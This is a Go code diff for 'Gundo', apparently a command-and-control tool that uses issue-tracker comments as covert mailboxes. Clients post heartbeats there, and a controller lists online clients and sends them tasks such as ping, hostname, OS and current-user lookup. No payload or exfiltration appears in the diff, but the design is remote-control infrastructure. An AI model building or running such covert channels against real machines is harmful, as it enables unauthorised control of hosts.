@@ -85,10 +85,118 @@ import (
 	"bufio"
 	"fmt"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 	"uuid"
 )
+
+// temp: represents the controllers known info about a client
+type ManagedClient struct {
+	ClientID    string
+	IssueNumber int
+	LastSeen    time.Time
+	Online      bool
+}
+
+func discoverClients() ([]ManagedClient, error) {
+	// process used to discover available cinets
+
+	// list all the issues representing the clients
+	issues, err := listIssues()
+	if err != nil {
+		return nil, err
+	}
+
+	// list representing structs of clients
+	var clients []ManagedClient
+
+	// prefixes
+	const clientTitlePrefix = "Gundo Client - "
+
+	// represents the treshold to determine an agent offline
+
+	const offlineThreshold = 6 * time.Minute
+
+	for _, issue := range issues {
+
+		// Ignore Issues that do not belong to Gundo clients.
+		if !strings.HasPrefix(issue.Title, clientTitlePrefix) {
+			continue
+		}
+
+		// recieves the client ID that comes after
+		clientID := strings.TrimPrefix(
+			issue.Title,
+			clientTitlePrefix,
+		)
+
+		// creating a new managed client for the valid agent issue
+		managedClient := ManagedClient{
+			ClientID:    clientID,
+			IssueNumber: issue.Number,
+			Online:      false,
+		}
+
+		// receive comments to find heartbeat
+		comments, err := listComments(issue.Number)
+		if err != nil {
+			fmt.Printf(
+				"Could not read Issue #%d: %v\n",
+				issue.Number,
+				err,
+			)
+
+			clients = append(clients, managedClient)
+			continue
+		}
+
+		// Search newest → oldest because we only care
+		// looking for the latest heartbeat.
+		for i := len(comments) - 1; i >= 0; i-- {
+			message, err := parseGundoMessage(comments[i].Body)
+			if err != nil {
+				continue
+			}
+
+			if message.Type != "heartbeat" {
+				continue
+			}
+
+			if message.ClientID != clientID {
+				continue
+			}
+
+			//format heartbeat time that could be understood and comared later
+			heartbeatTime, err := time.Parse(
+				time.RFC3339,
+				message.Timestamp,
+			)
+
+			if err != nil {
+				continue
+			}
+
+			// the last seen time goes to managedclient struct
+			managedClient.LastSeen = heartbeatTime
+
+			// compares current time to the stored heartbeatime do determine online status
+			if time.Since(heartbeatTime) < offlineThreshold {
+				managedClient.Online = true
+			}
+
+			// We searched backwards, so this is the
+			// newest heartbeat. Stop searching.
+			break
+		}
+
+		// adds client to the list of clients structs
+		clients = append(clients, managedClient)
+	}
+
+	// returns the final list
+	return clients, nil
+}
 
 // setup a runclient + a runcontroller for testing purposes
 
@@ -182,29 +290,16 @@ func waitForResult(issueNumber int, taskID string) (GundoMessage, error) {
 	}
 }
 
-func runController() {
-	// check for current state
-	// heartbeats to be added to test things out on its own
-	state, err := loadState()
-	if err != nil {
-		fmt.Printf("Failed to load client state: %v\n", err)
-		return
-	}
-
-	// picks up from current state
-	fmt.Println("=== Gundo Controller ===")
-	fmt.Printf("[+] Client ID: %s\n", state.ClientID)
-	fmt.Printf("[+] Mailbox: Issue #%d\n", state.IssueNumber)
-
-	reader := bufio.NewReader(os.Stdin)
-
+// using pointer to use the same terminal reader used in run controller
+func runCommandMenu(reader *bufio.Reader, client ManagedClient) {
 	for {
-		fmt.Println("\n=== Commands ===")
+		fmt.Printf("\n=== Client %s ===\n", client.ClientID)
+
 		fmt.Println("1. Ping")
 		fmt.Println("2. Get Hostname")
 		fmt.Println("3. Get OS")
-		fmt.Println("0. Exit")
-
+		fmt.Println("4. Get User")
+		fmt.Println("0. Back")
 		fmt.Print("\nSelect command: ")
 
 		input, err := reader.ReadString('\n')
@@ -213,8 +308,10 @@ func runController() {
 			continue
 		}
 
+		// grab choice from the list
 		choice := strings.TrimSpace(input)
 
+		// determine action
 		var action string
 
 		switch choice {
@@ -227,8 +324,10 @@ func runController() {
 		case "3":
 			action = "get_os"
 
+		case "4":
+			action = "get_user"
+
 		case "0":
-			fmt.Println("Exiting controller.")
 			return
 
 		default:
@@ -236,35 +335,26 @@ func runController() {
 			continue
 		}
 
-		// Create a new Gundo task based on the action
+		// create a task with the action and set the targetClientID with the
+		// client ID of the passed in client
 		task := createTaskMessage(action)
+		task.TargetClientID = client.ClientID
 
-		// Target the client loaded from state.json.
-		task.TargetClientID = state.ClientID
+		fmt.Printf("\n[+] Sending %s\n", action)
+		fmt.Printf("[+] Task ID: %s\n", task.TaskID)
 
-		fmt.Printf(
-			"\n[+] Sending %s task\n",
-			action,
-		)
-
-		fmt.Printf(
-			"[+] Task ID: %s\n",
-			task.TaskID,
-		)
-
-		// Send the task to this client's mailbox.
-		err = createComment(state.IssueNumber, task)
+		// creates comment with the task message
+		err = createComment(client.IssueNumber, task)
 		if err != nil {
 			fmt.Printf("Error sending task: %v\n", err)
 			continue
 		}
 
-		fmt.Println("[+] Task posted")
 		fmt.Println("[+] Waiting for result...")
 
-		// Wait specifically for this task's response.
+		// polling for the result from client execution
 		result, err := waitForResult(
-			state.IssueNumber,
+			client.IssueNumber,
 			task.TaskID,
 		)
 
@@ -273,9 +363,88 @@ func runController() {
 			continue
 		}
 
+		// prints the results
 		fmt.Println("\n=== Result ===")
 		fmt.Printf("Status: %s\n", result.Status)
 		fmt.Printf("Output: %s\n", result.Output)
+	}
+}
+
+func runController() {
+
+	// read buffer for terminal
+	reader := bufio.NewReader(os.Stdin)
+
+	for {
+		// creates list of clients
+
+		clients, err := discoverClients()
+		if err != nil {
+			fmt.Printf("Failed to discover clients: %v\n", err)
+			return
+		}
+
+		if len(clients) == 0 {
+			fmt.Println("No Gundo clients found.")
+			return
+		}
+
+		fmt.Println("\n=== Gundo Clients ===")
+
+		// loop over each client
+		for i, client := range clients {
+			status := "OFFLINE"
+
+			if client.Online {
+				status = "ONLINE"
+			}
+
+			// formatting to print each issue
+			fmt.Printf(
+				"%d. %s | Issue #%d | %s\n",
+				i+1,
+				client.ClientID,
+				client.IssueNumber,
+				status,
+			)
+		}
+
+		fmt.Println("0. Exit")
+		fmt.Print("\nSelect client: ")
+
+		input, err := reader.ReadString('\n')
+		if err != nil {
+			fmt.Printf("Error reading input: %v\n", err)
+			continue
+		}
+
+		// turn string to inpute to handle choice
+		choice, err := strconv.Atoi(strings.TrimSpace(input))
+		if err != nil {
+			fmt.Println("Invalid selection.")
+			continue
+		}
+
+		if choice == 0 {
+			return
+		}
+
+		// invalid client check
+		if choice < 1 || choice > len(clients) {
+			fmt.Println("Invalid client.")
+			continue
+		}
+
+		// represents the struct at the index of the client choice
+		selected := clients[choice-1]
+
+		if !selected.Online {
+			fmt.Println("[-] Client is currently offline.")
+			continue
+		}
+
+		// run commands based off the selected
+		runCommandMenu(reader, selected)
 	}
 }
 
